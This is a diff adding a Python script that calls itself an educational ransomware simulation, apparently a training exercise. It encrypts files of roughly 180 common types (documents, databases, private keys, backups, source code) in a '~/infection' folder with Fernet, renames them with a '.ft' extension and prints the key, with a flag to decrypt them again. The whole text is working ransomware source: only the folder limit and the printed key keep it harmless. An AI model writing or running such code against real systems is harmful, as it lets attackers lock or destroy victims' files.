@@ -1,0 +1,97 @@
+#!/usr/bin/env python3
+
+import argparse
+import os
+import sys
+from cryptography.fernet import Fernet
+
+key = Fernet.generate_key()
+cipher = Fernet(key)
+EXT = ".ft"
+
+extensions_to_encrypt = [
+    ".der", ".pfx", ".key", ".crt", ".csr", ".p12", ".pem", ".odt", ".ott", ".sxw", ".stw", ".uot",
+    ".3ds", ".max", ".3dm", ".ods", ".ots", ".sxc", ".stc", ".dif", ".slk", ".wb2", ".odp", ".otp",
+    ".sxd", ".std", ".uop", ".odg", ".otg", ".sxm", ".mml", ".lay", ".lay6", ".asc", ".sqlite3", ".sqlitedb",
+    ".sql", ".accdb", ".mdb", ".db", ".dbf", ".odb", ".frm", ".myd", ".myi", ".ibd", ".mdf", ".ldf", ".sln",
+    ".suo", ".cs", ".c", ".cpp", ".pas", ".h", ".asm", ".js", ".cmd", ".bat", ".ps1", ".vbs", ".vb", ".pl",
+    ".dip", ".dch", ".sch", ".brd", ".jsp", ".php", ".asp", ".rb", ".java", ".jar", ".class", ".sh", ".mp3",
+    ".wav", ".swf", ".fla", ".wmv", ".mpg", ".vob", ".mpeg", ".asf", ".avi", ".mov", ".mp4", ".3gp", ".mkv",
+    ".3g2", ".flv", ".wma", ".mid", ".m3u", ".m4u", ".djvu", ".svg", ".ai", ".psd", ".nef", ".tiff", ".tif",
+    ".cgm", ".raw", ".gif", ".png", ".bmp", ".jpg", ".jpeg", ".vcd", ".iso", ".backup", ".zip", ".rar", ".7z",
+    ".gz", ".tgz", ".tar", ".bak", ".tbk", ".bz2", ".PAQ", ".ARC", ".aes", ".gpg", ".vmx", ".vmdk", ".vdi",
+    ".sldm", ".sldx", ".sti", ".sxi", ".602", ".hwp", ".snt", ".onetoc2", ".dwg", ".pdf", ".wk1", ".wks",
+    ".123", ".rtf", ".csv", ".txt", ".vsdx", ".vsd", ".edb", ".eml", ".msg", ".ost", ".pst", ".potm", ".potx",
+    ".ppam", ".ppsx", ".ppsm", ".pps", ".pot", ".pptm", ".pptx", ".ppt", ".xltm", ".xltx", ".xlc", ".xlm",
+    ".xlt", ".xlw", ".xlsb", ".xlsm", ".xlsx", ".xls", ".dotx", ".dotm", ".dot", ".docm", ".docb", ".docx",
+    ".doc"
+]
+
+def check_infection_directory():
+    home_dir = os.path.expanduser("~")
+    infection_dir = os.path.join(home_dir, "infection")
+
+    if not os.path.exists(infection_dir):
+        print(f"The directory '{infection_dir}' does not exist. Please create it in your HOME directory.")
+        sys.exit(1)
+    
+    if not os.path.isdir(infection_dir):
+        print(f"'{infection_dir}' is not a directory. Please ensure it is a directory.")
+        sys.exit(1)
+    
+    return infection_dir
+
+def encrypt_files(directory, silent):
+    for filename in os.listdir(directory):
+        filepath = os.path.join(directory, filename)
+        if os.path.isfile(filepath):
+            if not filepath.endswith('.ft') and any(filepath.endswith(ext) for ext in extensions_to_encrypt):
+                with open(filepath, 'rb') as file:
+                    original_content = file.read()
+                encrypted_content = cipher.encrypt(original_content)
+                with open(filepath, 'wb') as file:
+                    file.write(encrypted_content)
+
+                new_file_path = filepath + '.ft'
+                os.rename(filepath, new_file_path)
+                if not silent:
+                    print(f"encrypt: {filepath} -> \033[91m{new_file_path}.\033[0m")
+
+    green_key = f"\033[92m{key.decode('utf-8')}\033[0m"
+    print(f"Encryption key: {green_key}")
+    
+
+def decrypt_files(directory, key, silent):
+    for filename in os.listdir(directory):
+        filepath = os.path.join(directory, filename)
+        if os.path.isfile(filepath):
+            if filepath.endswith('.ft'):
+                cipher = Fernet(key)
+                with open(filepath, 'rb') as file:
+                    encrypted_content = file.read()
+                decrypted_content = cipher.decrypt(encrypted_content)
+                with open(filepath, 'wb') as file:
+                    file.write(decrypted_content)
+
+                new_file_path = filepath[:-3]  # Supprimer les 3 derniers caractères ('.ft')
+                os.rename(filepath, new_file_path)
+                if not silent:
+                    print(f"Decrypting: {filepath} -> \033[92m{new_file_path}\033[0m ...")
+
+def main():
+    parser = argparse.ArgumentParser(description="This program simulates a simple ransomware for educational purposes.")
+    
+    parser.add_argument("-v", "--version", action="version", version="%(prog)s 1.0", help="show the version of the program and exit")
+    parser.add_argument("-r", "--reverse", metavar="KEY", type=str, help="reverse the infection using the provided key")
+    parser.add_argument("-s", "--silent", action="store_true", help="run the program in silent mode without outputting the encrypted files")
+    args = parser.parse_args()
+
+    infection_dir = check_infection_directory()
+    
+    if args.reverse:
+        decrypt_files(infection_dir, args.reverse, args.silent)
+    else:
+        encrypt_files(infection_dir, args.silent)
+
+if __name__ == "__main__":
+    main()
